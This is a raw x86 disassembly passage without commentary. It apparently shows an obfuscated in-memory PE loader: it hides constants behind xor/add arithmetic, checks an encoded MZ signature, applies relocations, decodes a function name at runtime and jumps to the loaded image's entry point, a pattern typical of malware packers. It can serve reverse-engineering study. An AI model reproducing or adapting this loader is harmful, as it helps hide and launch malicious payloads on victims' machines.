  413982:	mov    ecx,DWORD PTR [ebp-0x4]
  413985:	mov    edx,DWORD PTR [ebp-0x4]
  413988:	xor    ecx,esi
  41398a:	add    ecx,edi
  41398c:	xor    edx,esi
  41398e:	mov    DWORD PTR [ebp-0x24],ecx
  413991:	mov    ecx,DWORD PTR [eax]
  413993:	add    edx,edi
  413995:	add    ebx,edi
  413997:	cmp    ecx,edx
  413999:	je     0x4139a1
  41399b:	add    ecx,DWORD PTR [ebp+0x8]
  41399e:	mov    DWORD PTR [ebp-0x24],ecx
  4139a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4139a4:	xor    ecx,esi
  4139a6:	add    ecx,DWORD PTR [eax+0xc]
  4139a9:	mov    eax,DWORD PTR [ebp+0x8]
  4139ac:	lea    eax,[ecx+eax*1+0x3272dd]
  4139b3:	mov    DWORD PTR [ebp+0xc],eax
  4139b6:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4139bd:	mov    eax,DWORD PTR [ebp+0x10]
  4139c0:	push   DWORD PTR [ebp+0xc]
  4139c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4139c9:	call   DWORD PTR [eax]
  4139cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4139ce:	xor    ecx,esi
  4139d0:	add    ecx,edi
  4139d2:	mov    DWORD PTR [ebp-0xc],eax
  4139d5:	cmp    ecx,eax
  4139d7:	jne    0x4139eb
  4139d9:	mov    eax,DWORD PTR [ebp+0x10]
  4139dc:	push   DWORD PTR [ebp+0xc]
  4139df:	mov    eax,DWORD PTR [eax+0x1d8]
  4139e5:	call   DWORD PTR [eax+0xc]
  4139e8:	mov    DWORD PTR [ebp-0xc],eax
  4139eb:	mov    DWORD PTR [ebp-0x20],0x7f661b0a
  4139f2:	mov    DWORD PTR [ebp-0x20],0xf89c999a
  4139f9:	mov    eax,DWORD PTR [ebp-0x4]
  4139fc:	xor    eax,esi
  4139fe:	add    eax,edi
  413a00:	cmp    eax,DWORD PTR [ebp-0xc]
  413a03:	jne    0x413a28
  413a05:	mov    eax,DWORD PTR [ebp-0x8]
  413a08:	mov    ecx,DWORD PTR [ebp-0x20]
  413a0b:	xor    eax,esi
  413a0d:	xor    ecx,esi
  413a0f:	lea    ebx,[ebx+eax*1+0x3272dd]
  413a16:	mov    eax,DWORD PTR [ebp+0x10]
  413a19:	mov    eax,DWORD PTR [eax+0x1d8]
  413a1f:	add    ecx,edi
  413a21:	imul   ecx,ebx
  413a24:	push   ecx
  413a25:	call   DWORD PTR [eax+0x24]
  413a28:	mov    eax,DWORD PTR [ebp-0x4]
  413a2b:	xor    eax,esi
  413a2d:	add    eax,edi
  413a2f:	cmp    eax,DWORD PTR [ebp-0xc]
  413a32:	jne    0x413a43
  413a34:	mov    eax,DWORD PTR [ebp-0x28]
  413a37:	xor    eax,esi
  413a39:	add    eax,edi
  413a3b:	cmp    ebx,eax
  413a3d:	jbe    0x4139bd
  413a43:	mov    eax,DWORD PTR [ebp-0x4]
  413a46:	xor    eax,esi
  413a48:	add    eax,edi
  413a4a:	cmp    eax,DWORD PTR [ebp-0xc]
  413a4d:	jne    0x413a66
  413a4f:	mov    eax,DWORD PTR [ebp-0x8]
  413a52:	mov    ecx,DWORD PTR [ebp-0x18]
  413a55:	xor    eax,esi
  413a57:	lea    eax,[ecx+eax*1+0x3272dd]
  413a5e:	mov    DWORD PTR [ebp-0x18],eax
  413a61:	jmp    0x413b55
  413a66:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  413a6d:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  413a74:	mov    ebx,DWORD PTR [ebp-0x4]
  413a77:	xor    ebx,esi
  413a79:	add    ebx,edi
  413a7b:	jmp    0x413b42
  413a80:	mov    eax,DWORD PTR [ebp-0x4]
  413a83:	xor    eax,esi
  413a85:	add    eax,edi
  413a87:	mov    DWORD PTR [ebp-0x14],eax
  413a8a:	mov    eax,DWORD PTR [ebp-0x4]
  413a8d:	xor    eax,esi
  413a8f:	add    eax,edi
  413a91:	mov    DWORD PTR [ebp+0xc],eax
  413a94:	mov    ecx,DWORD PTR [ebp-0x4]
  413a97:	mov    eax,DWORD PTR [ebp-0x24]
  413a9a:	xor    ecx,esi
  413a9c:	add    ecx,edi
  413a9e:	cmp    ecx,eax
  413aa0:	je     0x413aa8
  413aa2:	mov    eax,DWORD PTR [eax+ebx*4]
  413aa5:	mov    DWORD PTR [ebp-0x14],eax
  413aa8:	mov    eax,DWORD PTR [ebp-0x1c]
  413aab:	mov    eax,DWORD PTR [eax+ebx*4]
  413aae:	mov    DWORD PTR [ebp+0xc],eax
  413ab1:	mov    eax,DWORD PTR [ebp-0x4]
  413ab4:	mov    ecx,DWORD PTR [ebp-0x14]
  413ab7:	xor    eax,esi
  413ab9:	add    eax,edi
  413abb:	cmp    eax,ecx
  413abd:	je     0x413ae8
  413abf:	mov    eax,DWORD PTR [ebp-0x4]
  413ac2:	mov    ecx,DWORD PTR [ebp-0x14]
  413ac5:	xor    eax,esi
  413ac7:	add    eax,edi
  413ac9:	shr    ecx,0x1f
  413acc:	cmp    eax,ecx
  413ace:	je     0x413ae8
  413ad0:	mov    ecx,DWORD PTR [ebp-0x14]
  413ad3:	mov    eax,DWORD PTR [ebp+0x10]
  413ad6:	mov    eax,DWORD PTR [eax+0x1d8]
  413adc:	movzx  ecx,cx
  413adf:	push   ecx
  413ae0:	push   DWORD PTR [ebp-0xc]
  413ae3:	call   DWORD PTR [eax+0x8]
  413ae6:	jmp    0x413b01
  413ae8:	mov    eax,DWORD PTR [ebp+0xc]
  413aeb:	add    eax,DWORD PTR [ebp+0x8]
  413aee:	mov    ecx,DWORD PTR [ebp+0x10]
  413af1:	mov    ecx,DWORD PTR [ecx+0x1d8]
  413af7:	add    eax,0x2
  413afa:	push   eax
  413afb:	push   DWORD PTR [ebp-0xc]
  413afe:	call   DWORD PTR [ecx+0x8]
  413b01:	mov    DWORD PTR [ebp+0xc],eax
  413b04:	mov    eax,DWORD PTR [ebp-0x4]
  413b07:	mov    ecx,DWORD PTR [ebp+0xc]
  413b0a:	xor    eax,esi
  413b0c:	add    eax,edi
  413b0e:	cmp    eax,ecx
  413b10:	mov    eax,DWORD PTR [ebp-0x8]
  413b13:	jne    0x413b26
  413b15:	mov    ecx,DWORD PTR [ebp-0x18]
  413b18:	xor    eax,esi
  413b1a:	lea    eax,[ecx+eax*1+0x3272dd]
  413b21:	mov    DWORD PTR [ebp-0x18],eax
  413b24:	jmp    0x413b36
  413b26:	mov    ecx,DWORD PTR [ebp+0xc]
  413b29:	xor    eax,esi
  413b2b:	add    eax,edi
  413b2d:	imul   eax,ecx
  413b30:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b33:	mov    DWORD PTR [ecx+ebx*4],eax
  413b36:	mov    eax,DWORD PTR [ebp-0x8]
  413b39:	xor    eax,esi
  413b3b:	lea    ebx,[ebx+eax*1+0x3272dd]
  413b42:	mov    eax,DWORD PTR [ebp-0x4]
  413b45:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b48:	xor    eax,esi
  413b4a:	add    eax,edi
  413b4c:	cmp    DWORD PTR [ecx+ebx*4],eax
  413b4f:	jne    0x413a80
  413b55:	mov    edx,DWORD PTR [ebp-0x10]
  413b58:	mov    eax,DWORD PTR [ebp-0x18]
  413b5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  413b5e:	sub    edx,0x3272dc
  413b64:	xor    edx,esi
  413b66:	jmp    0x413930
  413b6b:	mov    ecx,DWORD PTR [ebp-0x4]
  413b6e:	xor    ecx,esi
  413b70:	add    ecx,edi
  413b72:	cmp    eax,ecx
  413b74:	mov    eax,DWORD PTR [ebp-0x4]
  413b77:	jne    0x413b81
  413b79:	mov    eax,DWORD PTR [ebp-0x8]
  413b7c:	jmp    0x413b81
  413b7e:	mov    eax,DWORD PTR [ebp-0x4]
  413b81:	xor    eax,esi
  413b83:	add    eax,edi
  413b85:	pop    edi
  413b86:	pop    esi
  413b87:	pop    ebx
  413b88:	leave  
  413b89:	ret    0xc
  413b8c:	push   ebp
  413b8d:	mov    ebp,esp
  413b8f:	sub    esp,0x28
  413b92:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413b99:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  413ba0:	mov    eax,DWORD PTR [ebp+0xc]
  413ba3:	mov    DWORD PTR [ebp+0xc],eax
  413ba6:	push   esi
  413ba7:	mov    eax,eax
  413ba9:	mov    eax,DWORD PTR [ebp-0x4]
  413bac:	mov    esi,DWORD PTR [ebp+0x8]
  413baf:	mov    ecx,0x7510896
  413bb4:	xor    eax,ecx
  413bb6:	mov    edx,0x3272dd
  413bbb:	add    eax,edx
  413bbd:	cmp    esi,eax
  413bbf:	je     0x413ce6
  413bc5:	mov    eax,DWORD PTR [ebp+0x8]
  413bc8:	mov    esi,DWORD PTR [ebp+0x8]
  413bcb:	add    esi,DWORD PTR [eax+0x3c]
  413bce:	push   edi
  413bcf:	mov    DWORD PTR [ebp+0xc],esi
  413bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  413bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  413bdc:	mov    esi,DWORD PTR [ebp-0x4]
  413bdf:	mov    edi,DWORD PTR [ebp+0xc]
  413be2:	xor    esi,ecx
  413be4:	xor    eax,ecx
  413be6:	add    esi,edx
  413be8:	cmp    DWORD PTR [edi+eax*8+0x1939760],esi
  413bef:	je     0x413ce0
  413bf5:	mov    esi,DWORD PTR [ebp+0xc]
  413bf8:	mov    eax,DWORD PTR [ebp+0x8]
  413bfb:	add    eax,DWORD PTR [esi+0xa0]
  413c01:	mov    esi,DWORD PTR [ebp+0x8]
  413c04:	mov    edi,DWORD PTR [ebp+0xc]
  413c07:	sub    esi,DWORD PTR [edi+0x34]
  413c0a:	mov    edi,DWORD PTR [ebp-0x4]
  413c0d:	xor    edi,ecx
  413c0f:	add    edi,edx
  413c11:	mov    DWORD PTR [ebp-0x24],esi
  413c14:	cmp    esi,edi
  413c16:	je     0x413ce0
  413c1c:	mov    esi,DWORD PTR [ebp-0x4]
  413c1f:	xor    esi,ecx
  413c21:	add    esi,edx
  413c23:	mov    DWORD PTR [ebp-0x8],esi
  413c26:	push   ebx
  413c27:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  413c2e:	jmp    0x413cca
  413c33:	mov    esi,DWORD PTR [ebp-0x4]
  413c36:	xor    esi,ecx
  413c38:	lea    edi,[ebx-0x8]
  413c3b:	add    esi,edx
  413c3d:	shr    edi,1
  413c3f:	cmp    esi,edi
  413c41:	jae    0x413cb0
  413c43:	sub    edi,esi
  413c45:	lea    ebx,[eax+esi*2+0x8]
  413c49:	mov    DWORD PTR [ebp-0x18],edi
  413c4c:	movzx  esi,WORD PTR [ebx]
  413c4f:	and    esi,0xfff
  413c55:	mov    DWORD PTR [ebp-0x14],esi
  413c58:	mov    edi,DWORD PTR [ebp-0x14]
  413c5b:	mov    esi,DWORD PTR [eax]
  413c5d:	sub    esi,edx
  413c5f:	add    edi,esi
  413c61:	movzx  esi,WORD PTR [ebx]
  413c64:	shr    esi,0xc
  413c67:	xor    edi,ecx
  413c69:	mov    DWORD PTR [ebp-0x20],edi
  413c6c:	mov    DWORD PTR [ebp-0x14],esi
  413c6f:	mov    esi,DWORD PTR [ebp-0x20]
  413c72:	mov    edi,DWORD PTR [ebp+0x8]
  413c75:	xor    esi,ecx
  413c77:	lea    esi,[esi+edi*1+0x3272dd]
  413c7e:	mov    DWORD PTR [ebp-0x20],esi
  413c81:	mov    esi,DWORD PTR [ebp-0x10]
  413c84:	mov    edi,DWORD PTR [ebp-0x14]
  413c87:	xor    esi,ecx
  413c89:	add    esi,edx
  413c8b:	cmp    edi,esi
  413c8d:	jne    0x413ca5
  413c8f:	mov    esi,DWORD PTR [ebp-0x10]
  413c92:	mov    edi,DWORD PTR [ebp-0x14]
  413c95:	xor    esi,ecx
  413c97:	add    esi,edx
  413c99:	cmp    edi,esi
  413c9b:	jne    0x413ca5
  413c9d:	mov    esi,DWORD PTR [ebp-0x20]
  413ca0:	mov    edi,DWORD PTR [ebp-0x24]
  413ca3:	add    DWORD PTR [esi],edi
  413ca5:	add    ebx,0x2
  413ca8:	dec    DWORD PTR [ebp-0x18]
  413cab:	jne    0x413c4c
  413cad:	mov    ebx,DWORD PTR [ebp-0xc]
  413cb0:	add    DWORD PTR [ebp-0x8],ebx
  413cb3:	mov    esi,DWORD PTR [ebp-0x1c]
  413cb6:	mov    edi,DWORD PTR [ebp-0x8]
  413cb9:	mov    ebx,DWORD PTR [ebp+0xc]
  413cbc:	xor    esi,ecx
  413cbe:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939764]
  413cc5:	jae    0x413cdf
  413cc7:	add    eax,DWORD PTR [ebp-0xc]
  413cca:	mov    esi,DWORD PTR [ebp-0x4]
  413ccd:	mov    ebx,DWORD PTR [eax+0x4]
  413cd0:	xor    esi,ecx
  413cd2:	add    esi,edx
  413cd4:	mov    DWORD PTR [ebp-0xc],ebx
  413cd7:	cmp    ebx,esi
  413cd9:	jne    0x413c33
  413cdf:	pop    ebx
  413ce0:	mov    eax,DWORD PTR [ebp-0x28]
  413ce3:	pop    edi
  413ce4:	jmp    0x413ce9
  413ce6:	mov    eax,DWORD PTR [ebp-0x4]
  413ce9:	xor    eax,ecx
  413ceb:	add    eax,edx
  413ced:	pop    esi
  413cee:	leave  
  413cef:	ret    0x8
  413cf2:	push   ebp
  413cf3:	mov    ebp,esp
  413cf5:	sub    esp,0x54
  413cf8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413cff:	mov    DWORD PTR [ebp-0x24],0xf89c85b2
  413d06:	mov    eax,DWORD PTR [ebp-0x4]
  413d09:	push   ebx
  413d0a:	push   esi
  413d0b:	mov    esi,0x7510896
  413d10:	xor    eax,esi
  413d12:	mov    ebx,0x3272dd
  413d17:	add    eax,ebx
  413d19:	mov    DWORD PTR [ebp-0x18],eax
  413d1c:	mov    eax,DWORD PTR [ebp-0x4]
  413d1f:	xor    eax,esi
  413d21:	add    eax,ebx
  413d23:	mov    DWORD PTR [ebp-0x20],eax
  413d26:	push   edi
  413d27:	mov    edi,DWORD PTR [ebp+0x20]
  413d2a:	mov    eax,DWORD PTR [ebp-0x10]
  413d2d:	mov    ecx,DWORD PTR [ebp-0x10]
  413d30:	xor    eax,ecx
  413d32:	mov    DWORD PTR [ebp-0x10],eax
  413d35:	add    DWORD PTR [ebp-0x10],0xf89cb5b5
  413d3c:	mov    eax,DWORD PTR [ebp-0x8]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  413d42:	xor    eax,ecx
  413d44:	mov    DWORD PTR [ebp-0x8],eax
  413d47:	add    DWORD PTR [ebp-0x8],0xf89c85f5
  413d4e:	mov    eax,DWORD PTR [ebp-0xc]
  413d51:	mov    ecx,DWORD PTR [ebp-0xc]
  413d54:	xor    eax,ecx
  413d56:	mov    DWORD PTR [ebp-0xc],eax
  413d59:	add    DWORD PTR [ebp-0xc],0xf89c85b1
  413d60:	mov    eax,DWORD PTR [ebp-0x14]
  413d63:	mov    ecx,DWORD PTR [ebp-0x14]
  413d66:	xor    eax,ecx
  413d68:	mov    DWORD PTR [ebp-0x14],eax
  413d6b:	add    DWORD PTR [ebp-0x14],0xf89f05b5
  413d72:	mov    eax,0x9588
  413d77:	mov    WORD PTR [ebp+0x20],ax
  413d7b:	mov    eax,DWORD PTR [ebp+0x8]
  413d7e:	test   eax,eax
  413d80:	je     0x414165
  413d86:	mov    eax,DWORD PTR [ebp+0xc]
  413d89:	test   eax,eax
  413d8b:	je     0x414165
  413d91:	mov    eax,DWORD PTR [ebp+0x18]
  413d94:	test   eax,eax
  413d96:	je     0x414165
  413d9c:	mov    ax,WORD PTR [ebp+0x20]
  413da0:	mov    ecx,0x8a89
  413da5:	xor    ax,cx
  413da8:	mov    ecx,0x3b4c
  413dad:	add    ax,cx
  413db0:	mov    ecx,DWORD PTR [ebp+0x8]
  413db3:	cmp    WORD PTR [ecx],ax
  413db6:	jne    0x414165
  413dbc:	mov    eax,DWORD PTR [ebp-0x4]
  413dbf:	mov    ecx,DWORD PTR [ebp+0x8]
  413dc2:	mov    eax,DWORD PTR [ebp+0x8]
  413dc5:	add    eax,DWORD PTR [ecx+0x3c]
  413dc8:	mov    DWORD PTR [ebp+0xc],eax
  413dcb:	mov    eax,DWORD PTR [eax+0x50]
  413dce:	test   eax,eax
  413dd0:	je     0x414165
  413dd6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  413ddd:	mov    eax,DWORD PTR [ebp-0x2c]
  413de0:	xor    eax,esi
  413de2:	add    eax,ebx
  413de4:	mov    DWORD PTR [ebp-0x2c],eax
  413de7:	mov    eax,DWORD PTR [ebp-0x4]
  413dea:	mov    eax,DWORD PTR [edi+0x190]
  413df0:	mov    ecx,DWORD PTR [eax]
  413df2:	mov    ecx,DWORD PTR [ecx+0x3c]
  413df5:	add    ecx,DWORD PTR [eax]
  413df7:	mov    eax,DWORD PTR [ebp-0x4]
  413dfa:	mov    eax,DWORD PTR [edi+0x18c]
  413e00:	mov    edx,DWORD PTR [eax]
  413e02:	mov    DWORD PTR [ebp-0x1c],ecx
  413e05:	mov    DWORD PTR [ebp+0x20],edx
  413e08:	cmp    edx,edx
  413e0a:	jne    0x413e3f
  413e0c:	mov    eax,DWORD PTR [edi+0x1d8]
  413e12:	lea    edx,[ebp-0x18]
  413e15:	push   edx
  413e16:	mov    edx,DWORD PTR [ebp-0x8]
  413e19:	xor    edx,esi
  413e1b:	add    edx,ebx
  413e1d:	push   edx
  413e1e:	push   DWORD PTR [ecx+0x50]
  413e21:	push   DWORD PTR [ebp+0x20]
  413e24:	call   DWORD PTR [eax+0x1c]
  413e27:	mov    ecx,DWORD PTR [ebp-0x1c]
  413e2a:	mov    eax,DWORD PTR [ecx+0x54]
  413e2d:	mov    ecx,DWORD PTR [ecx+0x50]
  413e30:	sub    ecx,eax
  413e32:	add    eax,DWORD PTR [ebp+0x20]
  413e35:	push   ecx
  413e36:	push   eax
  413e37:	call   0x414779
  413e3c:	mov    edx,DWORD PTR [ebp+0x20]
  413e3f:	mov    eax,DWORD PTR [edi+0x194]
  413e45:	mov    DWORD PTR [eax],edx
  413e47:	mov    eax,DWORD PTR [ebp+0xc]
  413e4a:	push   DWORD PTR [eax+0x54]
  413e4d:	push   DWORD PTR [ebp+0x8]
  413e50:	push   edx
  413e51:	call   0x414620
  413e56:	mov    ecx,DWORD PTR [ebp+0x20]
  413e59:	mov    eax,DWORD PTR [ecx+0x3c]
  413e5c:	add    eax,ecx
  413e5e:	movzx  ecx,WORD PTR [eax+0x14]
  413e62:	lea    ecx,[ecx+eax*1+0x18]
  413e66:	mov    DWORD PTR [ebp+0x18],ecx
  413e69:	mov    ecx,DWORD PTR [ebp-0x4]
  413e6c:	movzx  edx,WORD PTR [eax+0x6]
  413e70:	xor    ecx,esi
  413e72:	add    ecx,ebx
  413e74:	mov    DWORD PTR [ebp+0xc],eax
  413e77:	cmp    edx,ecx
  413e79:	je     0x413f27
  413e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  413e82:	xor    ecx,esi
  413e84:	add    ecx,ebx
  413e86:	mov    DWORD PTR [ebp-0x20],ecx
  413e89:	mov    ecx,DWORD PTR [ebp-0x24]
  413e8c:	movzx  edx,WORD PTR [eax+0x6]
  413e90:	xor    ecx,esi
  413e92:	sub    edx,ecx
  413e94:	sub    edx,ebx
  413e96:	cmp    DWORD PTR [ebp-0x20],edx
  413e99:	ja     0x413f27
  413e9f:	mov    edx,DWORD PTR [ebp+0x18]
  413ea2:	add    edx,0x8
  413ea5:	mov    DWORD PTR [ebp+0x18],edx
  413ea8:	jmp    0x413ead
  413eaa:	mov    edx,DWORD PTR [ebp+0x18]
  413ead:	mov    eax,DWORD PTR [eax+0x38]
  413eb0:	lea    ecx,[eax-0x1]
  413eb3:	mov    DWORD PTR [ebp-0x30],eax
  413eb6:	mov    eax,DWORD PTR [edx]
  413eb8:	test   ecx,eax
  413eba:	je     0x413ec3
  413ebc:	not    ecx
  413ebe:	and    eax,ecx
  413ec0:	add    eax,DWORD PTR [ebp-0x30]
  413ec3:	push   eax
  413ec4:	mov    eax,DWORD PTR [edx+0x4]
  413ec7:	add    eax,DWORD PTR [ebp+0x20]
  413eca:	push   eax
  413ecb:	call   0x414779
  413ed0:	mov    edx,DWORD PTR [ebp-0x4]
  413ed3:	mov    eax,DWORD PTR [ebp+0x18]
  413ed6:	mov    ecx,DWORD PTR [eax+0x8]
  413ed9:	xor    edx,esi
  413edb:	add    edx,ebx
  413edd:	cmp    ecx,edx
  413edf:	je     0x413ef8
  413ee1:	push   ecx
  413ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  413ee5:	add    ecx,DWORD PTR [eax+0xc]
  413ee8:	mov    eax,DWORD PTR [eax+0x4]
  413eeb:	add    eax,DWORD PTR [ebp+0x20]
  413eee:	push   ecx
  413eef:	push   eax
  413ef0:	call   0x414620
  413ef5:	mov    eax,DWORD PTR [ebp+0x18]
  413ef8:	mov    ecx,DWORD PTR [ebp-0x24]
  413efb:	mov    edx,DWORD PTR [ebp-0x20]
  413efe:	add    eax,0x28
  413f01:	xor    ecx,esi
  413f03:	lea    ecx,[edx+ecx*1+0x3272dd]
  413f0a:	mov    edx,DWORD PTR [ebp+0xc]
  413f0d:	mov    DWORD PTR [ebp+0x18],eax
  413f10:	mov    eax,DWORD PTR [ebp-0x24]
  413f13:	movzx  edx,WORD PTR [edx+0x6]
  413f17:	xor    eax,esi
  413f19:	sub    edx,eax
  413f1b:	mov    eax,DWORD PTR [ebp+0xc]
  413f1e:	sub    edx,ebx
  413f20:	mov    DWORD PTR [ebp-0x20],ecx
  413f23:	cmp    ecx,edx
  413f25:	jbe    0x413eaa
  413f27:	mov    ecx,DWORD PTR [ebp-0x4]
  413f2a:	mov    edx,DWORD PTR [edi+0x18c]
  413f30:	xor    ecx,esi
  413f32:	add    ecx,ebx
  413f34:	mov    DWORD PTR [ebp+0x18],ecx
  413f37:	mov    ecx,DWORD PTR [ebp+0x20]
  413f3a:	cmp    ecx,DWORD PTR [edx]
  413f3c:	jne    0x413f65
  413f3e:	mov    eax,DWORD PTR [edi+0x1d8]
  413f44:	lea    edx,[ebp-0x18]
  413f47:	push   edx
  413f48:	mov    edx,DWORD PTR [ebp-0xc]
  413f4b:	xor    edx,esi
  413f4d:	add    edx,ebx
  413f4f:	push   edx
  413f50:	mov    edx,DWORD PTR [ebp-0x1c]
  413f53:	push   DWORD PTR [edx+0x54]
  413f56:	push   ecx
  413f57:	call   DWORD PTR [eax+0x1c]
  413f5a:	test   eax,eax
  413f5c:	je     0x414156
  413f62:	mov    eax,DWORD PTR [ebp+0xc]
  413f65:	mov    ecx,DWORD PTR [edi+0x1c8]
  413f6b:	mov    ecx,DWORD PTR [ecx]
  413f6d:	xor    ecx,esi
  413f6f:	add    ecx,ebx
  413f71:	je     0x414081
  413f77:	and    DWORD PTR [ebp-0x28],0x0
  413f7b:	mov    eax,0x4fab
  413f80:	mov    WORD PTR [ebp-0x3c],ax
  413f84:	add    eax,0xfffffff6
  413f87:	mov    WORD PTR [ebp-0x3a],ax
  413f8b:	mov    eax,0x4f91
  413f90:	mov    WORD PTR [ebp-0x38],ax
  413f94:	add    eax,0x18
  413f97:	and    DWORD PTR [ebp+0x8],0x0
  413f9b:	mov    ecx,eax
  413f9d:	mov    WORD PTR [ebp-0x34],ax
  413fa1:	mov    eax,0x4e3d
  413fa6:	mov    WORD PTR [ebp-0x36],cx
  413faa:	mov    WORD PTR [ebp-0x32],ax
  413fae:	mov    eax,DWORD PTR [ebp+0x8]
  413fb1:	lea    eax,[ebp+eax*2-0x3c]
  413fb5:	mov    ecx,0x8a89
  413fba:	xor    cx,WORD PTR [eax]
  413fbd:	mov    edx,0x3b4c
  413fc2:	add    cx,dx
  413fc5:	inc    DWORD PTR [ebp+0x8]
  413fc8:	cmp    DWORD PTR [ebp+0x8],0x6
  413fcc:	mov    WORD PTR [eax],cx
  413fcf:	jb     0x413fae
  413fd1:	mov    DWORD PTR [ebp-0x54],0x200c1e26
  413fd8:	mov    DWORD PTR [ebp-0x50],0x211e0805
  413fdf:	mov    DWORD PTR [ebp-0x4c],0xf50c0e08
  413fe6:	mov    DWORD PTR [ebp-0x48],0x3d0c0b20
  413fed:	mov    DWORD PTR [ebp-0x44],0x10c1e1e
  413ff4:	mov    WORD PTR [ebp-0x40],0xf0f
  413ffa:	mov    BYTE PTR [ebp-0x3e],0x7a
  413ffe:	xor    ecx,ecx
  414000:	lea    eax,[ebp+ecx*1-0x54]
  414004:	mov    dl,BYTE PTR [eax]
  414006:	xor    dl,0x71
  414009:	sub    dl,0xb
  41400c:	inc    ecx
  41400d:	mov    BYTE PTR [eax],dl
  41400f:	cmp    ecx,0x17
  414012:	jb     0x414000
  414014:	mov    eax,DWORD PTR [edi+0x1d8]
  41401a:	lea    ecx,[ebp-0x3c]
  41401d:	push   ecx
  41401e:	call   DWORD PTR [eax+0x4]
  414021:	mov    ecx,DWORD PTR [edi+0x1d8]
  414027:	lea    edx,[ebp-0x54]
  41402a:	push   edx
  41402b:	push   eax
  41402c:	call   DWORD PTR [ecx+0x8]
  41402f:	lea    ecx,[ebp-0x28]
  414032:	push   ecx
  414033:	mov    ecx,DWORD PTR [edi+0x18c]
  414039:	push   DWORD PTR [ecx]
  41403b:	call   eax
  41403d:	mov    eax,DWORD PTR [ebp-0x28]
  414040:	test   eax,eax
  414042:	je     0x41407e
  414044:	mov    DWORD PTR [ebp+0x8],eax
  414047:	jmp    0x414053
  414049:	mov    eax,DWORD PTR [eax]
  41404b:	mov    DWORD PTR [ebp-0x28],eax
  41404e:	cmp    eax,DWORD PTR [ebp+0x8]
  414051:	je     0x414060
  414053:	mov    edx,DWORD PTR [eax+0x18]
  414056:	mov    ecx,DWORD PTR [edi+0x18c]
  41405c:	cmp    edx,DWORD PTR [ecx]
  41405e:	jne    0x414049
  414060:	mov    edx,DWORD PTR [eax+0x18]
  414063:	mov    ecx,DWORD PTR [edi+0x18c]
  414069:	cmp    edx,DWORD PTR [ecx]
  41406b:	jne    0x41407e
  41406d:	mov    edx,DWORD PTR [ebp-0x1c]
  414070:	mov    ecx,DWORD PTR [edi+0x190]
  414076:	mov    edx,DWORD PTR [edx+0x28]
  414079:	add    edx,DWORD PTR [ecx]
  41407b:	mov    DWORD PTR [eax+0x1c],edx
  41407e:	mov    eax,DWORD PTR [ebp+0xc]
  414081:	push   edi
  414082:	push   eax
  414083:	push   DWORD PTR [ebp+0x20]
  414086:	call   0x4138a9
  41408b:	test   eax,eax
  41408d:	je     0x414156
  414093:	push   DWORD PTR [ebp+0xc]
  414096:	mov    ecx,edi
  414098:	push   DWORD PTR [ebp+0x20]
  41409b:	call   0x413802
  4140a0:	test   eax,eax
  4140a2:	je     0x414156
  4140a8:	mov    eax,DWORD PTR [ebp+0xc]
  4140ab:	mov    edx,DWORD PTR [ebp+0x20]
  4140ae:	mov    ecx,edi
  4140b0:	call   0x4136db
  4140b5:	test   eax,eax
  4140b7:	je     0x414156
  4140bd:	push   edi
  4140be:	push   DWORD PTR [ebp+0x20]
  4140c1:	call   0x413b8c
  4140c6:	test   eax,eax
  4140c8:	je     0x414156
  4140ce:	mov    eax,DWORD PTR [edi+0x18c]
  4140d4:	mov    edx,DWORD PTR [ebp+0x20]
  4140d7:	cmp    edx,DWORD PTR [eax]
  4140d9:	jne    0x4140f5
  4140db:	mov    eax,DWORD PTR [edi+0x1d8]
  4140e1:	lea    ecx,[ebp-0x18]
  4140e4:	push   ecx
  4140e5:	push   DWORD PTR [ebp-0x18]
  4140e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4140eb:	push   DWORD PTR [ecx+0x54]
  4140ee:	push   edx
  4140ef:	call   DWORD PTR [eax+0x1c]
  4140f2:	mov    edx,DWORD PTR [ebp+0x20]
  4140f5:	mov    eax,DWORD PTR [edi+0x1c8]
  4140fb:	mov    eax,DWORD PTR [eax]
  4140fd:	xor    eax,esi
  4140ff:	add    eax,ebx
  414101:	je     0x41413a
  414103:	mov    ecx,DWORD PTR [ebp+0xc]
  414106:	mov    eax,DWORD PTR [ecx+0x28]
  414109:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  414110:	mov    esi,DWORD PTR [ebp+0x8]
  414113:	push   DWORD PTR [ebp+0x14]
  414116:	xor    esi,0x896
  41411c:	push   DWORD PTR [ebp+0x10]
  41411f:	add    esi,0x72dd
  414125:	or     WORD PTR [ecx+0x16],si
  414129:	add    eax,edx
  41412b:	push   edx
  41412c:	call   eax
  41412e:	mov    DWORD PTR [edi+0x1d0],0xf89c85b2
  414138:	jmp    0x414144
  41413a:	mov    eax,DWORD PTR [ebp+0xc]
  41413d:	mov    eax,DWORD PTR [eax+0x28]
  414140:	add    eax,edx
  414142:	call   eax
  414144:	mov    DWORD PTR [ebp-0x20],eax
  414147:	mov    eax,DWORD PTR [ebp-0x20]
  41414a:	mov    ecx,DWORD PTR [ebp+0x1c]
  41414d:	mov    DWORD PTR [ecx],eax
  41414f:	mov    DWORD PTR [ebp+0x18],0x1
  414156:	cmp    DWORD PTR [ebp+0x18],0x0
  41415a:	jne    0x414160
  41415c:	and    DWORD PTR [ebp+0x20],0x0
  414160:	mov    eax,DWORD PTR [ebp+0x20]
  414163:	jmp    0x414167
  414165:	xor    eax,eax
  414167:	pop    edi
  414168:	pop    esi
  414169:	pop    ebx
  41416a:	leave  
  41416b:	ret    0x1c
  41416e:	push   ebp
  41416f:	mov    ebp,esp
  414171:	movzx  edx,WORD PTR [ecx+0x6]
